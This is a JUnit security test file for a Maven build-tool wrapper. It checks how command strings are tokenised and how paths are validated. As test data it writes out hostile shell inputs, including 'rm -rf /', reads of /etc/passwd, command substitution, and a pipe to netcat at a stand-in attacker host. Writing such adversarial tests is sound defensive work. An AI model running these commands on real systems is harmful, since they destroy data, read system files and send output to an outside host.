package com.pragmatik.buildtools;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Path;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("Security and adversarial tests")
class MavenSecurityTest {

    private final MavenService service = new MavenService();

    @TempDir
    Path tempDir;

    @Nested
    @DisplayName("Command injection via getCommands()")
    class CommandInjectionGetCommands {

        @Test
        @DisplayName("shell command chaining with &&")
        void shellChainingWithDoubleAmpersand() {
            String[] result = MavenInvoker.getCommands("mvn clean && rm -rf /");
            assertThat(result).containsExactly("clean", "&&", "rm", "-rf", "/");
        }

        @Test
        @DisplayName("shell command chaining with semicolon")
        void shellChainingWithSemicolon() {
            String[] result = MavenInvoker.getCommands("mvn clean ; cat /etc/passwd");
            assertThat(result).containsExactly("clean", ";", "cat", "/etc/passwd");
        }

        @Test
        @DisplayName("shell command substitution with backticks")
        void shellCommandSubstitutionBackticks() {
            String[] result = MavenInvoker.getCommands("mvn clean `touch /tmp/pwned`");
            assertThat(result).containsExactly("clean", "`touch", "/tmp/pwned`");
        }

        @Test
        @DisplayName("shell command substitution with dollar-paren")
        void shellCommandSubstitutionDollarParen() {
            String[] result = MavenInvoker.getCommands("mvn clean $(cat /etc/passwd)");
            assertThat(result).containsExactly("clean", "$(cat", "/etc/passwd)");
        }

        @Test
        @DisplayName("pipe injection attempt")
        void pipeInjection() {
            String[] result = MavenInvoker.getCommands("mvn clean | nc attacker.com 4444");
            assertThat(result).containsExactly("clean", "|", "nc", "attacker.com", "4444");
        }

        @Test
        @DisplayName("exec:exec plugin bypass attempt")
        void execExecBypass() {
            String[] result = MavenInvoker.getCommands("mvn exec:exec -Dexec.executable=/bin/sh");
            assertThat(result).containsExactly("exec:exec", "-Dexec.executable=/bin/sh");
        }
    }

    @Nested
    @DisplayName("Path traversal via projectDir")
    class PathTraversalProjectDir {

        @Test
        @DisplayName("path traversal with dotdot in projectDir")
        void pathTraversalWithDotDot() {
            Path traversal = tempDir.resolve("../../../etc");
            try {
                service.executeCommand(tempDir.toString(), traversal.toString(), "clean");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("does not exist");
            }
        }
    }

    @Nested
    @DisplayName("Unicode and encoding attacks")
    class UnicodeAttacks {

        @Test
        @DisplayName("Unicode homoglyph attack in command")
        void unicodeHomoglyphAttack() {
            String[] result = MavenInvoker.getCommands("mvn cleanX");
            assertThat(result).containsExactly("cleanX");
        }

        @Test
        @DisplayName("zero-width characters in command")
        void zeroWidthCharacters() {
            String[] result = MavenInvoker.getCommands("mvn cle\u200Ban\u200B");
            assertThat(result).containsExactly("cle\u200Ban\u200B");
        }
    }

    @Nested
    @DisplayName("Denial of service via long inputs")
    class LongInputAttacks {

        @Test
        @DisplayName("very long command")
        void veryLongCommand() {
            StringBuilder sb = new StringBuilder("mvn");
            for (int i = 0; i < 10000; i++) {
                sb.append(" clean");
            }
            String[] result = MavenInvoker.getCommands(sb.toString());
            assertThat(result).hasSize(10000);
        }

        @Test
        @DisplayName("extremely long mavenHome path")
        void extremelyLongMavenHomePath() {
            StringBuilder sb = new StringBuilder(tempDir.toString());
            while (sb.length() < 10000) {
                sb.append("/a");
            }
            try {
                service.executeCommand(sb.toString(), tempDir.toString(), "clean");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("Invalid maven home directory");
            }
        }
    }

    @Nested
    @DisplayName("Security posture documentation")
    class SecurityPostureDocumentation {

        @Test
        @DisplayName("mavenHome validation blocks nonexistent paths")
        void mavenHomeValidationBlocksNonexistentPaths() {
            try {
                service.executeCommand("/nonexistent/path", tempDir.toString(), "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("Invalid maven home directory");
            }
        }

        @Test
        @DisplayName("projectDir validation blocks nonexistent paths")
        void projectDirValidationBlocksNonexistentPaths() {
            try {
                service.executeCommand(tempDir.toString(), "/nonexistent/project", "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("does not exist");
            }
        }

        @Test
        @DisplayName("null mavenHome is rejected")
        void nullMavenHomeRejected() {
            try {
                service.executeCommand(null, tempDir.toString(), "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("cannot be null");
            }
        }

        @Test
        @DisplayName("null projectDir is rejected")
        void nullProjectDirRejected() {
            try {
                service.executeCommand(tempDir.toString(), null, "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("cannot be null");
            }
        }

        @Test
        @DisplayName("getCommands does NOT sanitize shell metacharacters")
        void getCommandsDoesNotSanitizeShellMetacharacters() {
            String[] result = MavenInvoker.getCommands("mvn clean && rm -rf /");
            assertThat(result).contains("&&", "rm");
        }
    }
}
